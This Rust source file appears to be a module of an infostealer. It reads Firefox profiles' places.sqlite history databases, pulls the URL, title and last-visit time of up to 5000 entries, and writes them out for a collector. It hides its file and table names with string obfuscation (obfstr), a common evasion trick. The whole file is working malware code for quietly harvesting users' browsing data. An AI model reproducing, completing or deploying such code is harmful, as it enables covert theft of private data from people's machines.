use crate::alloc::borrow::ToOwned;
use crate::gecko::GeckoBrowserData;
use crate::{read_and_collect_unique_records, to_string_and_write_all, History, SqliteDatabase};
use alloc::sync::Arc;
use collector::{Browser, Collector};
use database::TableRecord;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::FileSystem;
use obfstr::obfstr as s;
use tasks::{parent_name, Task};

const MOZ_PLACES_URL: usize = 1;
const MOZ_PLACES_TITLE: usize = 2;
const MOZ_PLACES_LAST_VISIT_DATE: usize = 8;

pub(super) struct HistoryTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>
}

impl<'a> HistoryTask<'a> {
    pub(super) fn new(browser: Arc<GeckoBrowserData<'a>>) -> Self {
        Self { browser }
    }
}

impl<C: Collector, F: FileSystem> Task<C, F> for HistoryTask<'_> {
    parent_name!("History");
    
    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(mut history) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("places.sqlite"),
            s!("moz_places"),
            extract_history_from_record
        ) else {
            return
        };
        
        history.sort_by(|a, b| b.last_visit_time.cmp(&a.last_visit_time));
        history.truncate(5000);
        
        collector.get_browser().increase_history_by(history.len());
        let _ = to_string_and_write_all(&history, "\n\n", filesystem, parent);
    }
}

fn extract_history_from_record<R: TableRecord>(record: &R) -> Option<History> {
    let url = record.get_value(MOZ_PLACES_URL)?.as_string()?.to_owned();
    let title = record.get_value(MOZ_PLACES_TITLE)?.as_string()?.to_owned();
    let last_visit_time = record.get_value(MOZ_PLACES_LAST_VISIT_DATE)?.as_integer()?.to_owned();
    
    Some(History {
        url,
        title,
        last_visit_time
    })
}